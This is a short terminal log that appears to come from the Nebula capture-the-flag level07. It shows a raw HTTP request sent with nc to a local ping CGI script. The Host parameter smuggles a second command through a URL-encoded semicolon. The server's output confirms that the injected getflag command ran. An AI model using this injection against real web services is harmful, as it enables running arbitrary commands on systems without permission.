```
level07@nebula:~$ echo -ne "GET /index.cgi?Host=localhost%3bgetflag\n\n" | nc localhost 7007
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.037 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.036 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.017/0.030/0.037/0.009 ms
You have successfully executed getflag on a target account
</pre></body></html>
```
